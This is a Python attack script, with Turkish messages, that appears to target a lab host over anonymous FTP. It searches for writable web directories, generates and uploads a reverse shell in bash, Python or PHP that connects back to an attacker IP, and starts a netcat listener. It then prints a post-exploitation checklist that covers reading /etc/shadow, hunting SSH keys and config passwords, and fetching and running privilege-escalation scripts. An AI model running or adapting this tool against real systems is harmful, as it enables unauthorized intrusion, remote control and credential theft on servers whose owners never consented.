#!/usr/bin/env python3
import os
import subprocess
import random
import string
from ftplib import FTP, error_perm
import time

# --- Configuration ---
host = "10.0.2.24"
username = "anonymous"
password = "anonymous"

reverse_ip = "10.0.2.10"  # Your attacking machine's IP address
reverse_port = "4444"
shell_filename = "revshell.sh" # Default shell filename

# Common web server root directories to check for write access
COMMON_WEB_ROOTS = [
    "/var/www/html",
    "/var/www",
    "/srv/www",
    "/usr/local/apache2/htdocs",
    "/opt/lampp/htdocs",
    "/usr/share/nginx/html",
    "/", # Root directory, often writable on misconfigured FTP
]

# --- Helper Functions ---
def get_random_string(length=8):
    """Generates a random string of specified length."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_reverse_shell(file_name, shell_type="bash"):
    """
    Generates a reverse shell script based on the specified type.
    Supported types: bash, python, php.
    """
    shell_content = ""
    if shell_type == "bash":
        shell_content = f"#!/bin/bash\nbash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1"
    elif shell_type == "python":
        shell_content = (
            f"#!/usr/bin/env python\n"
            f"import socket,subprocess,os\n"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            f"s.connect(('{reverse_ip}',{reverse_port}))\n"
            f"os.dup2(s.fileno(),0)\n"
            f"os.dup2(s.fileno(),1)\n"
            f"os.dup2(s.fileno(),2)\n"
            f"p=subprocess.call(['/bin/sh','-i'])\n"
        )
    elif shell_type == "php":
        # Fixed: Using triple quotes for raw string to avoid Python interpreting PHP backslashes
        shell_content = f"""<?php
set_time_limit(0);
ignore_user_abort(true);
ini_set('max_execution_time', 0);
$ip = '{reverse_ip}';
$port = {reverse_port};
$sock = fsockopen($ip, $port);
$descriptorspec = array(
   0 => array('pipe', 'r'),
   1 => array('pipe', 'w'),
   2 => array('pipe', 'w')
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes, null, array());
if (is_resource($process)) {{
    while (!feof($sock)) {{
        $line = fgets($sock, 1024);
        fwrite($pipes[0], $line);
        $output = fread($pipes[1], 1024);
        fwrite($sock, $output);
    }}
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}}
?>"""
    else:
        print(f"[-] Desteklenmeyen kabuk türü: {shell_type}. Bash kabuğu oluşturuluyor.")
        return generate_reverse_shell(file_name, "bash") # Fallback to bash

    with open(file_name, "w") as f:
        f.write(shell_content)
    print(f"[+] Reverse shell script oluşturuldu ({shell_type}): {file_name}")

def connect_ftp():
    """Establishes an FTP connection."""
    try:
        ftp = FTP(host)
        ftp.login(username, password)
        print(f"[+] FTP bağlantısı başarılı: {host}")
        return ftp
    except Exception as e:
        print(f"[-] FTP bağlantısı başarısız: {e}")
        return None

def find_writable_directory(ftp, test_filename):
    """
    Attempts to find a writable directory on the FTP server.
    Prioritizes common web roots, then tries to create a new directory,
    then iterates through existing directories.
    """
    original_cwd = ftp.pwd() # Store original working directory

    # 1. Try common web roots
    print("[*] Ortak web kök dizinleri kontrol ediliyor...")
    for path in COMMON_WEB_ROOTS:
        try:
            ftp.cwd(path)
            with open(test_filename, "rb") as f:
                ftp.storbinary(f"STOR {test_filename}", f)
            ftp.delete(test_filename) # Clean up test file
            print(f"[+] Yazılabilir dizin bulundu: {path}")
            ftp.cwd(original_cwd) # Go back to original CWD
            return path
        except error_perm as e:
            # Permission denied, directory doesn't exist, etc.
            # print(f"[-] {path} dizinine yazılamıyor veya mevcut değil: {e}")
            pass
        except Exception as e:
            print(f"[-] {path} dizini kontrol edilirken hata oluştu: {e}")
            pass
        finally:
            try:
                ftp.cwd(original_cwd) # Always try to return to original CWD
            except:
                pass

    # 2. Try to create a new directory
    print("[*] Yeni bir dizin oluşturulmaya çalışılıyor...")
    new_dir = get_random_string(10)
    try:
        ftp.mkd(new_dir)
        ftp.cwd(new_dir)
        with open(test_filename, "rb") as f:
            ftp.storbinary(f"STOR {test_filename}", f)
        ftp.delete(test_filename)
        print(f"[+] Yeni oluşturulan dizin yazılabilir: {new_dir}")
        ftp.rmd(new_dir) # Clean up created directory
        ftp.cwd(original_cwd)
        return new_dir
    except error_perm as e:
        print(f"[-] Yeni dizin oluşturulamadı veya yazılamadı: {e}")
    except Exception as e:
        print(f"[-] Yeni dizin oluşturulurken hata oluştu: {e}")
    finally:
        try:
            ftp.cwd(original_cwd)
        except:
            pass


    # 3. Iterate through existing directories (less reliable due to permissions)
    print("[*] Mevcut dizinler taranıyor...")
    try:
        directories = ftp.nlst()
        for d in directories:
            try:
                ftp.cwd(d)
                with open(test_filename, "rb") as f:
                    ftp.storbinary(f"STOR {test_filename}", f)
                ftp.delete(test_filename) # Clean up test file
                print(f"[+] Yazılabilir dizin bulundu: {d}")
                ftp.cwd(original_cwd)
                return d
            except error_perm:
                # Permission denied for this directory, continue
                pass
            except Exception as e:
                # print(f"[-] {d} dizini kontrol edilirken hata oluştu: {e}")
                pass
            finally:
                try:
                    ftp.cwd(original_cwd)
                except:
                    pass
    except Exception as e:
        print(f"[-] Dizin listeleme başarısız: {e}")

    print("[-] Yazılabilir dizin bulunamadı.")
    return None

def upload_reverse_shell(ftp, writable_dir):
    """Uploads the reverse shell script to the specified directory."""
    try:
        ftp.cwd(writable_dir)
        with open(shell_filename, "rb") as f:
            ftp.storbinary(f"STOR {shell_filename}", f)
        print(f"[+] Shell yüklendi: {writable_dir}/{shell_filename}")
        return True
    except Exception as e:
        print(f"[-] Shell yükleme başarısız: {e}")
        return False
    finally:
        ftp.cwd("/") # Return to root for safety

def start_listener():
    """Starts a Netcat listener in a new gnome-terminal window."""
    print(f"[*] Netcat dinleyici başlatılıyor: nc -lvnp {reverse_port}")
    try:
        # Use gnome-terminal for a new window, adjust for other terminals if needed
        subprocess.Popen(f"gnome-terminal -- bash -c 'nc -lvnp {reverse_port}; echo \"Dinleyici kapatıldı. Çıkış için Enter tuşuna basın.\"; read'", shell=True)
        print("[+] Dinleyici başarıyla başlatıldı. Yeni terminal penceresini kontrol edin.")
        time.sleep(2) # Give some time for the terminal to open
    except FileNotFoundError:
        print("[-] 'gnome-terminal' bulunamadı. Lütfen Netcat dinleyiciyi manuel olarak başlatın:")
        print(f"    nc -lvnp {reverse_port}")
    except Exception as e:
        print(f"[-] Dinleyici başlatılırken hata oluştu: {e}")
        print(f"    Lütfen Netcat dinleyiciyi manuel olarak başlatın: nc -lvnp {reverse_port}")

def post_exploitation_guide(uploaded_path):
    """Provides a guide for post-exploitation and privilege escalation."""
    print("\n" + "="*50)
    print("[+] POST-EXPLOITATION VE YETKİ YÜKSELTME KILAVUZU")
    print("="*50)

    print("\n[!] Shell'i tetiklemek için aşağıdaki komutu hedef sistemde çalıştırın (FTP dizinine göre):")
    print(f"    curl http://{host}{uploaded_path}/{shell_filename}")
    print("    veya")
    print(f"    wget http://{host}{uploaded_path}/{shell_filename} -O /tmp/{shell_filename} && chmod +x /tmp/{shell_filename} && /tmp/{shell_filename}")
    print("\n[!] Shell'i aldıktan sonra, aşağıdaki komutları adım adım çalıştırarak bilgi toplayın ve yetki yükseltme fırsatlarını arayın:\n")

    print("--- 1. Temel Sistem Bilgileri ---")
    print("whoami")
    print("id")
    print("uname -a")
    print("hostname")
    print("ip a")
    print("cat /etc/issue")
    print("cat /etc/*-release")
    print("df -h")
    print("mount")
    print("env")

    print("\n--- 2. Ağ Bilgileri ---")
    print("netstat -tulnp")
    print("cat /etc/resolv.conf")
    print("cat /etc/hosts")

    print("\n--- 3. Kullanıcı ve Grup Bilgileri ---")
    print("cat /etc/passwd")
    print("cat /etc/shadow 2>/dev/null") # Try to read, but expect permission denied
    print("getent passwd")
    print("getent group")
    print("ls -la /home/")
    print("last -a")

    print("\n--- 4. Sudo Yetkileri ---")
    print("sudo -l")
    print("find / -perm -u=s -o -perm -g=s 2>/dev/null") # SUID/SGID binaries

    print("\n--- 5. Cron İşleri ---")
    print("ls -la /etc/cron*")
    print("cat /etc/crontab")
    print("ls -la /var/spool/cron/crontabs/")

    print("\n--- 6. Yazılabilir Dosyalar ve Dizinler ---")
    print("find / -writable -type d 2>/dev/null")
    print("find / -writable -type f 2>/dev/null")
    print("find /var/log -type f -writable 2>/dev/null")
    print("find /tmp -type d -writable 2>/dev/null")

    print("\n--- 7. Yapılandırma Dosyaları ve Hassas Bilgiler ---")
    print("grep -r \"password\" /etc/ 2>/dev/null")
    print("grep -r \"api_key\" /var/www/ 2>/dev/null")
    print("cat /etc/fstab")
    print("cat /etc/exports") # NFS shares
    print("ls -laR /var/www/") # Web server files
    print("find / -name \"config.php\" 2>/dev/null")
    print("find / -name \"wp-config.php\" 2>/dev/null")
    print("find / -name \"id_rsa\" 2>/dev/null") # SSH private keys

    print("\n--- 8. Kernel Bilgileri ve Exploit Arama ---")
    print("uname -a")
    print("dmesg | grep Linux")
    print("cat /proc/version")
    print("cat /etc/lsb-release || cat /etc/debian_version || cat /etc/redhat-release")
    print("\n[!] Kernel veya işletim sistemi sürümüne göre 'Exploit-DB' veya 'Searchsploit' kullanarak bilinen zafiyetleri arayın.")

    print("\n--- 9. Otomatik Yetki Yükseltme Araçları (Manuel Çalıştırılacak) ---")
    print("Eğer hedef sistemde Python veya başka bir yorumlayıcı varsa, LinPEAS veya Pspy gibi araçları kullanabilirsiniz.")
    print("Örnek: wget https://github.com/carlospolop/privilege-escalation-awesome-scripts/raw/master/linPEAS/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh")
    print("Örnek: wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64 && /tmp/pspy64")

    print("\n" + "="*50)
    print("[+] Yetki yükseltme adımları tamamlandı. İyi şanslar!")
    print("="*50 + "\n")

# --- Main Execution ---
if __name__ == "__main__":
    # Allow user to choose shell type
    chosen_shell_type = input("Hangi türde reverse shell oluşturulsun? (bash/python/php) [bash]: ").strip().lower()
    if chosen_shell_type not in ["bash", "python", "php", ""]:
        print("[-] Geçersiz kabuk türü. Varsayılan olarak 'bash' kullanılacak.")
        chosen_shell_type = "bash"
    elif chosen_shell_type == "":
        chosen_shell_type = "bash"

    generate_reverse_shell(shell_filename, chosen_shell_type)

    # Create a dummy file for testing writability
    test_file = f"test_{get_random_string(6)}.tmp"
    with open(test_file, "w") as f:
        f.write("test")

    ftp = connect_ftp()
    if ftp:
        writable_dir = find_writable_directory(ftp, test_file)
        if writable_dir:
            if upload_reverse_shell(ftp, writable_dir):
                # Construct the full path to the uploaded shell for the guide
                uploaded_path_for_guide = writable_dir if writable_dir.startswith('/') else f"/{writable_dir}"
                if not uploaded_path_for_guide.endswith('/'):
                    uploaded_path_for_guide += '/'

                start_listener()
                post_exploitation_guide(uploaded_path_for_guide)
            else:
                print("[-] Shell yüklenemedi. Devam edilemiyor.")
        else:
            print("[-] Yazılabilir dizin bulunamadı. Shell yüklenemedi.")
        ftp.quit() # Close FTP connection
    else:
        print("[-] FTP bağlantısı kurulamadı. İşlem durduruldu.")

    # Clean up the generated shell file and test file
    if os.path.exists(shell_filename):
        os.remove(shell_filename)
        print(f"[*] {shell_filename} silindi.")
    if os.path.exists(test_file):
        os.remove(test_file)
        print(f"[*] {test_file} silindi.")
